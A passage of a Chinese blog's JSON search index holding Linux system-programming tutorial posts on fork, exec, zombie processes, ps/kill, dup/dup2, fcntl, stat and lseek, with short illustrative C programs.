pid==[%d], fpid==[%d]\\n\", pid, getpid(),getppid()); &#125; else if(pid==0) //子进程 &#123; printf(\"child: pid==[%d], fpid==[%d]\\n\", getpid(), getppid()); sleep(20); printf(\"child: pid==[%d], fpid==[%d]\\n\", getpid(), getppid()); &#125; return 0;&#125; 123456789101112131415161718192021222324252627282930//僵尸进程#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;int main()&#123; //创建子进程 pid_t pid = fork(); if(pid&lt;0) //fork失败的情况 &#123; perror(\"fork error\"); return -1; &#125; else if(pid&gt;0)//父进程 &#123; sleep(100); printf(\"father: [%d], pid==[%d], fpid==[%d]\\n\", pid, getpid(),getppid()); &#125; else if(pid==0) //子进程 &#123; printf(\"child: pid==[%d], fpid==[%d]\\n\", getpid(), getppid()); &#125; return 0;&#125; 编写模拟僵尸进程的代码讲解僵尸进程, 验证若子进程先于父进程退出, 而父进程没有调用wait或者waitpid函数进行回收, 从而使子进程成为了僵尸进程. 孤儿进程: 父进程先退出, 子进程就变成了孤儿进程, 此时被init进程领养, 当孤儿进程退出之后, 就会被init进程回收. 僵尸进程: 子进程先退出, 父进程没有完成对子进程的回收, 此时子进程就变成了僵尸进程. 如何解决僵尸进程: 不能使用kill -9杀死僵尸进程, 原因是僵尸进程是一个死掉的进程; 应该使用杀死僵尸进程父进程的方法来解决僵尸进程; 原因是: 杀死其父进程可以让init进程领养僵尸进程,最后由init进程回收僵尸进程.","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"exec函数族","slug":"linux061exec函数族","date":"2022-01-12T07:02:22.000Z","updated":"2022-01-15T08:34:32.175Z","comments":true,"path":"2022/01/12/linux061exec函数族/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/12/linux061exec函数族/","excerpt":"","text":"函数作用和函数介绍 有的时候需要在一个进程里面执行其他的命令或者是用户自定义的应用程序，此时就用到了exec函数族当中的函数。 使用方法一般都是在父进程里面调用fork创建处子进程，然后在子进程里面调用exec函数。 execl函数 1#include &lt;unistd.h&gt; 函数原型: 1int execl(const char *path, const char *arg, ... /* (char *) NULL */); 参数介绍： path: 要执行的程序的绝对路径 变参arg: 要执行的程序的需要的参数 arg:占位，通常写应用程序的名字 arg后面的: 命令的参数 参数写完之后: NULL 返回值：若是成功，则不返回，不会再执行exec函数后面的代码；若是失败，会执行execl后面的代码，可以用perror打印错误原因。 execl函数一般执行自己写的程序。 execlp函数 1#include &lt;unistd.h&gt; 函数原型: 1int execlp(const char *file, const char *arg, .../* (char *) NULL */); 参数介绍： file: 执行命令的名字, 根据PATH环境变量来搜索该命令 arg:占位 arg后面的: 命令的参数 参数写完之后: NULL 返回值：若是成功，则不返回，不会再执行exec函数后面的代码；若是失败，会执行exec后面的代码，可以用perror打印错误原因。 execlp函数一般是执行系统自带的程序或者是命令. exec函数族原理介绍 exec族函数的实现原理图： 如： 1execlp(“ls”, “ls”, “-l”, NULL); 总结： exec函数是用一个新程序替换了当前进程的代码段、数据段、堆和栈；原有的进程空间没有发生变化，并没有创建新的进程，进程PID没有发生变化。 如果想在一个进程内部执行系统命令或者是应用程序, 优先应该想到如下方式: 先fork(), 然后在子进程里面执行execl拉起可执行程序或者命令. 12345pid = fork();if(pid==0)&#123; execl(...);&#125; execl: 一般用于执行用户自定义的应用程序. execlp: 一般用于执行系统命令 12345678910111213141516171819202122232425262728293031323334//fork函数测试#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;int main()&#123; //创建子进程 pid_t pid = fork(); if(pid&lt;0) //fork失败的情况 &#123; perror(\"fork error\"); return -1; &#125; else if(pid&gt;0)//父进程 &#123; printf(\"father: [%d], pid==[%d], fpid==[%d]\\n\", pid, getpid(),getppid()); //sleep(1); &#125; else if(pid==0) //子进程 &#123; printf(\"child: pid==[%d], fpid==[%d]\\n\", getpid(), getppid()); //execl(\"/bin/ls\", \"ls\", \"-l\", NULL); //execl(\"./test\", \"test\", \"hello\", \"world\", \"ni\", \"hao\", NULL); //execlp(\"ls\", \"ls\", \"-l\", NULL); execlp(\"./test\", \"TESTING\", \"hello\", \"world\", \"ni\", \"hao\", NULL); //execlp(\"./iitest\", \"test\", \"hello\", \"world\", \"ni\", \"hao\", NULL); perror(\"execl error\"); &#125; return 0;&#125;","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"ps和kill命令","slug":"linux060ps和kill命令","date":"2022-01-12T06:47:50.000Z","updated":"2022-01-12T06:51:59.541Z","comments":true,"path":"2022/01/12/linux060ps和kill命令/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/12/linux060ps和kill命令/","excerpt":"","text":"123ps aux | grep &quot;xxx&quot;ps ajx | grep &quot;xxx&quot; -a：（all）当前系统所有用户的进程 -u：查看进程所有者及其他一些信息 -x：显示没有控制终端的进程 – 不能与用户进行交互的进程【输入、输出】 -j: 列出与作业控制相关的信息 kill -l 查看系统有哪些信号 kill -9 pid 杀死某个线程 1234567891011121314151617181920212223242526272829303132333435-A 显示所有进程（等价于-e）(utility)-a 显示一个终端的所有进程，除了会话引线-N 忽略选择。-d 显示所有进程，但省略所有的会话引线(utility)-x 显示没有控制终端的进程，同时显示各个命令的具体路径。dx不可合用。（utility）-p pid 进程使用cpu的时间-u uid or username 选择有效的用户id或者是用户名-g gid or groupname 显示组的所有进程。U username 显示该用户下的所有进程，且显示各个命令的详细路径。如:ps U zhang;(utility)-f 全部列出，通常和其他选项联用。如：ps -fa or ps -fx and so on.-l 长格式（有F,wchan,C 等字段）-j 作业格式-o 用户自定义格式。v 以虚拟存储器格式显示s 以信号格式显示-m 显示所有的线程-H 显示进程的层次(和其它的命令合用，如：ps -Ha)（utility）e 命令之后显示环境（如：ps -d e; ps -a e）(utility)h 不显示第一行ps命令常用用法（方便查看系统进程）1）ps a 显示现行终端机下的所有程序，包括其他用户的程序。2）ps -A 显示所有进程。3）ps c 列出程序时，显示每个程序真正的指令名称，而不包含路径，参数或常驻服务的标示。4）ps -e 此参数的效果和指定&quot;A&quot;参数相同。5）ps e 列出程序时，显示每个程序所使用的环境变量。6）ps f 用ASCII字符显示树状结构，表达程序间的相互关系。7）ps -H 显示树状结构，表示程序间的相互关系。8）ps -N 显示所有的程序，除了执行ps指令终端机下的程序之外。9）ps s 采用程序信号的格式显示程序状况。10）ps S 列出程序时，包括已中断的子程序资料。11）ps -t&lt;终端机编号&gt; 指定终端机编号，并列出属于该终端机的程序的状况。12）ps u 以用户为主的格式来显示程序状况。13）ps x 显示所有程序，不以终端机来区分。 123456789101112131415161718192021222324252627282930313233USER 用户名UID 用户ID（User ID）PID 进程ID（Process ID）PPID 父进程的进程ID（Parent Process id）SID 会话ID（Session id）%CPU 进程的cpu占用率%MEM 进程的内存占用率VSZ 进程所使用的虚存的大小（Virtual Size）RSS 进程使用的驻留集大小或者是实际内存的大小，Kbytes字节。TTY 与进程关联的终端（tty）STAT 进程的状态：进程状态使用字符表示的（STAT的状态码）R 运行 Runnable (on run queue) 正在运行或在运行队列中等待。S 睡眠 Sleeping 休眠中, 受阻, 在等待某个条件的形成或接受到信号。I 空闲 IdleZ 僵死 Zombie（a defunct process) 进程已终止, 但进程描述符存在, 直到父进程调用wait4()系统调用后释放。D 不可中断 Uninterruptible sleep (ususally IO) 收到信号不唤醒和不可运行, 进程必须等待直到有中断发生。T 终止 Terminate 进程收到SIGSTOP, SIGSTP, SIGTIN, SIGTOU信号后停止运行运行。P 等待交换页W 无驻留页 has no resident pages 没有足够的记忆体分页可分配。X 死掉的进程&lt; 高优先级进程 高优先序的进程N 低优先 级进程 低优先序的进程L 内存锁页 Lock 有记忆体分页分配并缩在记忆体内s 进程的领导者（在它之下有子进程）；l 多进程的（使用 CLONE_THREAD, 类似 NPTL pthreads）+ 位于后台的进程组 START 进程启动时间和日期TIME 进程使用的总cpu时间COMMAND 正在执行的命令行命令NI 优先级(Nice)PRI 进程优先级编号(Priority)WCHAN 进程正在睡眠的内核函数名称；该函数的名称是从/root/system.map文件中获得的。FLAGS 与进程相关的数字标识","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"fork函数","slug":"linux059fork函数","date":"2022-01-12T05:58:43.000Z","updated":"2022-01-12T06:24:29.950Z","comments":true,"path":"2022/01/12/linux059fork函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/12/linux059fork函数/","excerpt":"","text":"头文件 12#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt; 函数作用： 创建子进程 原型: 1pid_t fork(void); 函数参数：无 返回值： 调用成功:父进程返回子进程的PID，子进程返回0； 调用失败:返回-1，设置errno值。 fork函数代码片段实例 调用fork函数的内核实现原理: fork函数总结 fork函数的返回值？ 父进程返回子进程的PID，是一个大于0数; 子进程返回0； 特别需要注意的是：不是fork函数在一个进程中返回2个值，而是在父子进程各自返回一个值。 子进程创建成功后，代码的执行位置？ 父进程执行到什么位置，子进程就从哪里执行 如何区分父子进程 通过fork函数的返回值 父子进程的执行顺序 不一定，哪个进程先抢到CPU，哪个进程就先执行 getpid/getppid 头文件 12#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt; getpid 得到当前进程的PID 1pid_t getpid(void); getppid得到当前进程的父进程的PID 1pid_t getppid(void); 1234567891011121314151617181920212223242526272829303132//fork函数测试#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;int main()&#123; printf(\"before fork, pid:[%d]\\n\", getpid()); //创建子进程 //pid_t fork(void); pid_t pid = fork(); if(pid&lt;0) //fork失败的情况 &#123; perror(\"fork error\"); return -1; &#125; else if(pid&gt;0)//父进程 &#123; printf(\"father: [%d], pid==[%d], fpid==[%d]\\n\", pid, getpid(),getppid()); //sleep(1); &#125; else if(pid==0) //子进程 &#123; printf(\"child: pid==[%d], fpid==[%d]\\n\", getpid(), getppid()); &#125; printf(\"after fork, pid:[%d]\\n\", getpid()); return 0;&#125; 循环创建n个子程序 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556//循环创建n个子进程#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;int main()&#123; int i = 0; for(i=0; i&lt;3; i++) &#123; //创建子进程 pid_t pid = fork(); if(pid&lt;0) //fork失败的情况 &#123; perror(\"fork error\"); return -1; &#125; else if(pid&gt;0)//父进程 &#123; printf(\"father: pid==[%d], fpid==[%d]\\n\", getpid(),getppid()); //sleep(1); &#125; else if(pid==0) //子进程 &#123; printf(\"child: pid==[%d], fpid==[%d]\\n\", getpid(), getppid()); break; &#125; &#125; //第1个子进程 if(i==0) &#123; printf(\"[%d]--[%d]: child\\n\", i, getpid()); &#125; //第2个子进程 if(i==1) &#123; printf(\"[%d]--[%d]: child\\n\", i, getpid()); &#125; //第3个子进程 if(i==2) &#123; printf(\"[%d]--[%d]: child\\n\", i, getpid()); &#125; //父进程 if(i==3) &#123; printf(\"[%d]--[%d]: child\\n\", i, getpid()); &#125; sleep(10); return 0;&#125; 验证父子进程能否共享全局变量 父子进程不能共享全局变量: 如果父子进程只是对全局变量做读操作,则父子进程在内存中只有一份，属于共享。但是如果父子进程中的如何一个进程对该全局变量做修改操作，会在内存中拷贝一个副本，然后在这个副本上进行修改，修改完成以后映射回去 写时复制，读时共享 123456789101112131415161718192021222324252627282930313233//fork函数测试#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;int g_var = 99;int main()&#123; //创建子进程 pid_t pid = fork(); if(pid&lt;0) //fork失败的情况 &#123; perror(\"fork error\"); return -1; &#125; else if(pid&gt;0)//父进程 &#123; printf(\"father: [%d], pid==[%d], fpid==[%d]\\n\", pid, getpid(),getppid()); g_var++; printf(\"[%p]\", &amp;g_var); &#125; else if(pid==0) //子进程 &#123; sleep(1); //为了避免父进程还没有执行, 子进程已经结束了 printf(\"[%p]\", &amp;g_var); printf(\"child: pid==[%d], fpid==[%d]\\n\", getpid(), getppid()); printf(\"child: g_var==[%d]\\n\", g_var); &#125; return 0;&#125;","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"进程状态切换","slug":"linux058进程状态切换","date":"2022-01-12T05:47:47.000Z","updated":"2022-01-12T05:58:25.229Z","comments":true,"path":"2022/01/12/linux058进程状态切换/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/12/linux058进程状态切换/","excerpt":"","text":"进程基本的状态有5种。分别为初始态，就绪态，运行态，挂起态与终止态。其中初始态为进程准备阶段，常与就绪态结合来看。","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"PCB相关概念","slug":"linux057PCB相关概念","date":"2022-01-12T03:41:44.000Z","updated":"2022-01-12T03:45:52.722Z","comments":true,"path":"2022/01/12/linux057PCB相关概念/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/12/linux057PCB相关概念/","excerpt":"","text":"每个进程在内核中都有一个进程控制块（PCB）来维护进程相关的信息，Linux内核的进程控制块是task_struct结构体。 /usr/src/linux-headers-4.4.0-96/include/linux/sched.h文件的1390行处可以查看struct task_struct结构体定义。其内部成员有很多，我们重点掌握以下部分即可： 进程id。系统中每个进程有唯一的id，在C语言中用pid_t类型表示，其实就是一个非负整数。 进程的状态，有就绪、运行、挂起、停止等状态。 进程切换时需要保存和恢复的一些CPU寄存器。 描述虚拟地址空间的信息。 描述控制终端的信息。 当前工作目录（Current Working Directory）。 12getcwd --pwdchdir 更改当前工作目录 umask掩码。 文件描述符表，包含很多指向file结构体的指针。 和信号相关的信息。 用户id和组id。 会话（Session）和进程组。 进程可以使用的资源上限（Resource Limit）。 1ulimit -a","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"并行和并发的概念","slug":"linux056并行和并发的概念","date":"2022-01-11T18:48:13.000Z","updated":"2022-01-11T18:50:04.935Z","comments":true,"path":"2022/01/12/linux056并行和并发的概念/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/12/linux056并行和并发的概念/","excerpt":"","text":"并发，在一个时间段内, 是在同一个cpu上, 同时运行多个程序。 如：若将CPU的1S的时间分成1000个时间片，每个进程执行完一个时间片必须无条件让出CPU的使用权，这样1S中就可以执行1000个进程。 并行性指两个或两个以上的程序在同一时刻发生(需要有多颗)。 ​ 并发: 在一个时间段内, 一个CPU上, 有多个程序在执行. ​ 并行: 在一个时间片内, 有多个程序在执行(前提是有多个cpu) ​ cpu会将一个大的时间段分成多个小的时间片, 让进程轮流使用CPU的时间片.","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"程序和进程","slug":"linux055程序和进程","date":"2022-01-11T18:29:20.000Z","updated":"2022-01-11T18:47:27.417Z","comments":true,"path":"2022/01/12/linux055程序和进程/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/12/linux055程序和进程/","excerpt":"","text":"程序和进程 程序，是指编译好的二进制文件，在磁盘上，占用磁盘空间, 是一个静态的概念. 进程，一个启动的程序， 进程占用的是系统资源，如：物理内存，CPU，终端等，是一个动态的概念 程序 → 剧本(纸) 进程 → 戏(舞台、演员、灯光、道具…) 同一个剧本可以在多个舞台同时上演。同样，同一个程序也可以加载为不同的进程(彼此之间互不影响) 同一个程序可以在多个终端执行, 类似与同一台戏可以在多个舞台演出. 每启动一个程序都会有一个进程PID, 即使是相同的程序多次启动也会有个不同的PID.","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"fcntl函数","slug":"linux054fcntl函数","date":"2022-01-10T17:35:43.000Z","updated":"2022-01-10T17:42:52.338Z","comments":true,"path":"2022/01/11/linux054fcntl函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/11/linux054fcntl函数/","excerpt":"","text":"fcntl函数 函数描述: 改变已经打开的文件的属性 函数原型: 1int fcntl(int fd, int cmd, ... /* arg */ ); 若cmd为F_DUPFD, 复制文件描述符, 与dup相同 若cmd为F_GETFL, 获取文件描述符的flag属性值 若cmd为 F_SETFL, 设置文件描述符的flag属性 函数返回值:返回值取决于cmd 成功: 若cmd为F_DUPFD, 返回一个新的文件描述符 若cmd为F_GETFL, 返回文件描述符的flags值 若cmd为 F_SETFL, 返回0 失败返回-1, 并设置errno值. fcntl函数常用的操作: 1.复制一个新的文件描述符: 1int newfd = fcntl(fd, F_DUPFD, 0); 2.获取文件的属性标志 1int flag = fcntl(fd, F_GETFL, 0) 3 设置文件状态标志 123flag = flag | O_APPEND;fcntl(fd, F_SETFL, flag) 4 常用的属性标志 123O_APPEND-----设置文件打开为末尾添加O_NONBLOCK-----设置打开的文件描述符为非阻塞 1234567891011121314151617181920212223242526272829303132//修改文件描述符的flag属性#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;int main(int argc, char *argv[])&#123; //打开文件 int fd = open(argv[1], O_RDWR); if(fd&lt;0) &#123; perror(\"open error\"); return -1; &#125; //获得和设置fd的flags属性 int flags = fcntl(fd, F_GETFL, 0); flags = flags | O_APPEND; fcntl(fd, F_SETFL, flags); //写文件 write(fd, \"hello world\", strlen(\"hello world\")); //关闭文件 close(fd); return 0;&#125;","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"dup2函数","slug":"linux053dup2函数","date":"2022-01-10T10:12:57.000Z","updated":"2022-01-10T16:46:01.368Z","comments":true,"path":"2022/01/10/linux053dup2函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/10/linux053dup2函数/","excerpt":"","text":"快速生成可执行文件 123make 源文件名(去掉.c后缀)例如当前目录下有一个main.c文件make main //会生成一个main可执行文件 dup2函数 头文件 1#include &lt;unistd.h&gt; 函数描述: 复制文件描述符 函数原型: 1int dup2(int oldfd, int newfd); 函数参数: oldfd-原来的文件描述符 newfd-复制成的新的文件描述符 函数返回值: 成功: 将oldfd复制给newfd, 两个文件描述符指向同一个文件 失败: 返回-1, 设置errno值 假设newfd已经指向了一个文件，首先close原来打开的文件，然后newfd指向oldfd指向的文件. 若newfd没有被占用，newfd指向oldfd指向的文件. dup2函数实现重定向操作 123456789101112131415161718192021222324252627282930//使用dup2函数实现标准输出重定向操作#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;int main(int argc, char *argv[])&#123; //打开文件 int fd = open(argv[1], O_RDWR | O_CREAT, 0777); if(fd&lt;0) &#123; perror(&quot;open error&quot;); return -1; &#125; //调用dup2函数实现文件重定向操作 dup2(fd, STDOUT_FILENO); printf(&quot;ni hao hello world&quot;); close(fd); close(STDOUT_FILENO); return 0;&#125;","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"dup函数","slug":"linux052dup函数","date":"2022-01-10T09:30:54.000Z","updated":"2022-01-15T06:45:28.405Z","comments":true,"path":"2022/01/10/linux052dup函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/10/linux052dup函数/","excerpt":"","text":"dup函数 头文件 1#include &lt;unistd.h&gt; 函数描述: 复制文件描述符 函数原型: 1int dup(int oldfd); 函数参数: oldfd -要复制的文件描述符 函数返回值: 成功: 返回最小且没被占用的文件描述符 失败: 返回-1, 设置errno值 123456789101112131415161718192021222324252627282930313233343536373839404142//测试dup函数复制文件描述符#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;int main(int argc, char *argv[])&#123; //打开文件 int fd = open(argv[1], O_RDWR); if(fd&lt;0) &#123; perror(&quot;open error&quot;); return -1; &#125; //调用dup函数复制fd int newfd = dup(fd); printf(&quot;newfd:[%d], fd:[%d]\\n&quot;, newfd, fd); //使用fd对文件进行写操作 write(fd, &quot;hello world&quot;, strlen(&quot;hello world&quot;)); //调用lseek函数移动文件指针到开始处 lseek(fd, 0, SEEK_SET); //使用newfd读文件 char buf[64]; memset(buf, 0x00, sizeof(buf)); int n = read(newfd, buf, sizeof(buf)); printf(&quot;read over: n==[%d], buf==[%s]\\n&quot;, n, buf); //关闭文件 close(fd); close(newfd); return 0;&#125;","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"目录操作相关函数","slug":"linux051目录操作相关函数","date":"2022-01-10T08:43:59.000Z","updated":"2022-01-10T08:56:14.139Z","comments":true,"path":"2022/01/10/linux051目录操作相关函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/10/linux051目录操作相关函数/","excerpt":"","text":"opendir函数 函数描述:打开一个目录 函数原型: 1DIR *opendir(const char *name); 函数返回值: 指向目录的指针 函数参数: 要遍历的目录(相对路径或者绝对路径) readdir函数 函数描述: 读取目录内容–目录项 函数原型: 1struct dirent *readdir(DIR *dirp); 函数返回值: 读取的目录项指针，有错误发生或读取到目录文件尾则返回NULL。，出错会设置errno变量 成功时，返回1。在目录末尾，返回0。在出现错误时，返回-1，并正确设置errno。 函数参数: opendir函数的返回值 123456789101112131415struct dirent&#123; ino_t d_ino; // 此目录进入点的inode off_t d_off; // 目录文件开头至此目录进入点的位移 signed short int d_reclen; // d_name 的长度, 不包含NULL 字符 unsigned char d_type; // d_name 所指的文件类型 char d_name[256]; // 文件名&#125;; 12345678910111213141516d_type的取值: DT_BLK - 块设备 DT_CHR - 字符设备 DT_DIR - 目录 DT_LNK - 软连接 DT_FIFO - 管道 DT_REG - 普通文件 DT_SOCK - 套接字 DT_UNKNOWN - 未知 closedir函数 函数描述: 关闭目录 函数原型: 1int closedir(DIR *dirp); 函数返回值: 成功返回0, 失败返回-1 函数参数: opendir函数的返回值 读取目录内容的一般步骤 1 DIR *pDir = opendir(“dir”); //打开目录 2 while((p=readdir(pDir))!=NULL){} //循环读取文件 3 closedir(pDir); //关闭目录","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"stat和lstat函数","slug":"linux050stat和lstat函数","date":"2022-01-10T08:13:48.000Z","updated":"2022-01-10T08:26:51.848Z","comments":true,"path":"2022/01/10/linux050stat和lstat函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/10/linux050stat和lstat函数/","excerpt":"","text":"id命令 1# id //显示当前用户ID 函数描述: 获取文件属性 函数原型: 123int stat(const char *pathname, struct stat *buf);int lstat(const char *pathname, struct stat *buf); 函数返回值： 成功返回 0 失败返回 -1 123456789101112131415struct stat &#123; dev_t st_dev; //文件的设备编号 ino_t st_ino; //节点 mode_t st_mode; //文件的类型和存取的权限 nlink_t st_nlink; //连到该文件的硬连接数目，刚建立的文件值为1 uid_t st_uid; //用户ID gid_t st_gid; //组ID dev_t st_rdev; //(设备类型)若此文件为设备文件，则为其设备编号 off_t st_size; //文件字节数(文件大小) blksize_t st_blksize; //块大小(文件系统的I/O 缓冲区大小) blkcnt_t st_blocks; //块数 time_t st_atime; //最后一次访问时间 time_t st_mtime; //最后一次修改时间 time_t st_ctime; //最后一次改变时间(指属性) &#125;; 12345678910111213141516171819202122232425262728293031-st_mode -- 16位整数 0-2 bit -- 其他人权限 S_IROTH 00004 读权限 S_IWOTH 00002 写权限 S_IXOTH 00001 执行权限 S_IRWXO 00007 掩码, 过滤 st_mode中除其他人权限以外的信息 3-5 bit -- 所属组权限 S_IRGRP 00040 读权限 S_IWGRP 00020 写权限 S_IXGRP 00010 执行权限 S_IRWXG 00070 掩码, 过滤 st_mode中除所属组权限以外的信息 6-8 bit -- 文件所有者权限 S_IRUSR 00400 读权限 S_IWUSR 00200 写权限 S_IXUSR 00100 执行权限 S_IRWXU 00700 掩码, 过滤 st_mode中除文件所有者权限以外的信息 If (st_mode &amp; S_IRUSR) -----为真表明可读 If (st_mode &amp; S_IWUSR) ------为真表明可写 If (st_mode &amp; S_IXUSR) ------为真表明可执行 12-15 bit -- 文件类型 S_IFSOCK 0140000 套接字 S_IFLNK 0120000 符号链接（软链接） S_IFREG 0100000 普通文件 S_IFBLK 0060000 块设备 S_IFDIR 0040000 目录 S_IFCHR 0020000 字符设备 S_IFIFO 0010000 管道 S_IFMT 0170000 掩码,过滤 st_mode中除文件类型以外的信息 If ((st_mode &amp; S_IFMT)==S_IFREG) ----为真普通文件 if(S_ISREG(st_mode)) ------为真表示普通文件 if(S_ISDIR(st.st_mode)) ------为真表示目录文件 判断是什么文件的宏函数 1234567S_ISREG(); //判断是否为普通文件S_ISDIR(); //判断是否为目录S_ISCHR(); //判断是否为字符设备文件S_ISBLK(); //判断是否为块设备文件S_ISFIFO(); //判断是否为管道文件S_ISLNK(); //判断是否为符号链接文件S_ISSOCK() //判断是否为套接字文件 stat函数和lstat函数的区别 对于普通文件, 这两个函数没有区别, 是一样的. 对于连接文件,调用lstat函数获取的是链接文件本身的属性信息; 而stat函数获取的是链接文件指向的文件的属性信息.","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"read函数阻塞和非阻塞","slug":"linux049read函数阻塞和非阻塞","date":"2022-01-10T05:24:06.000Z","updated":"2022-01-10T05:26:31.039Z","comments":true,"path":"2022/01/10/linux049read函数阻塞和非阻塞/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/10/linux049read函数阻塞和非阻塞/","excerpt":"","text":"通过读普通文件测试得知: read函数在读完文件内容之后, 若再次read,则read函数会立刻返回, 表明read函数读普通文件是非阻塞的. ​ 设备文件: /dev/tty 标准输入STDIN_FILENO 通过读/dev/tty终端设备文件, 表明read函数读设备文件是阻塞的. 结论: 阻塞和非阻塞不是read函数的属性, 而是文件本身的属性. socket(套接字)，pipe（管道）这两种文件都是阻塞的.","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"lseek函数","slug":"linux048lseek函数","date":"2022-01-09T16:25:39.000Z","updated":"2022-01-09T17:05:34.569Z","comments":true,"path":"2022/01/10/linux048lseek函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/10/linux048lseek函数/","excerpt":"","text":"要包含头文件: 12#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt; 函数原型: 123456789101112131415off_t lseek(int fd, off_t offset, int whence);参数1 文件描述符参数2 参数offset 为根据参数whence 来移动读写位置的位移数。参数3 whence 为下列其中一种: SEEK_SET 参数offset 即为新的读写位置. SEEK_CUR 以目前的读写位置往后增加offset 个位移量. SEEK_END 将读写位置指向文件尾后再增加offset 个位移量. 当whence 值为SEEK_CUR 或 SEEK_END 时, 参数offet 允许负值的出现.下列是教特别的使用方式:1) 欲将读写位置移到文件开头时:lseek(int fildes, 0, SEEK_SET);2) 欲将读写位置移到文件尾时:lseek(int fildes, 0, SEEK_END);3) 想要取得目前文件位置时:lseek(int fildes, 0, SEEK_CUR); 返回值：当调用成功时则返回目前的读写位置, 也就是距离文件开头多少个字节. 若有错误则返回-1, errno 会存放错误代码. 获取文件大小 12int size = lseek(fd,0,SEEK_END);printf(&quot;size:%d \\n&quot;,size); 文件拓展: 就是将文件扩大 12lseek(fd,2000,SEEK_END); //拓展2000个字节write(fd,&apos;a&apos;,1); //写一些字符后生效 拓展之后需要手动写随便一些东西才生效 123456789101112131415161718192021222324252627282930#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include&lt;fcntl.h&gt;#include&lt;sys/types.h&gt;#include&lt;sys/stat.h&gt;#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123; int fd1 = open(\"./newfile\",O_RDWR | O_CREAT,0664); if(fd1 == -1)&#123; perror(\"open:\"); exit(-1); &#125; //获取文件大小 int size = lseek(fd1,0,SEEK_END); printf(\"size:%d\\n\",size); //拓展文件 int ret = lseek(fd1,2000,SEEK_END); printf(\"%d\\n\",ret); write(fd1,\"a\",1); close(fd1); return 0;&#125;","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"read和write函数","slug":"linux047read和wirte函数","date":"2022-01-08T15:04:52.000Z","updated":"2022-02-09T18:50:20.787Z","comments":true,"path":"2022/01/08/linux047read和wirte函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/08/linux047read和wirte函数/","excerpt":"","text":"read函数 123456789101112要包含头文件#include &lt;unistd.h&gt;函数原型ssize_t read(int fd, void *buf, size_t count);参数1 int fd, //文件描述符参数2 void *buf, //缓冲区地址参数3 size_t count //要读取的字节个数返回值成功返回读取的字节数，出错返回-1并设置errno，如果在调read之前已到达文件末尾，则这次read返回0。 write函数 123456789101112要包含头文件#include &lt;unistd.h&gt;函数原型ssize_t write(int fd, const void *buf, size_t 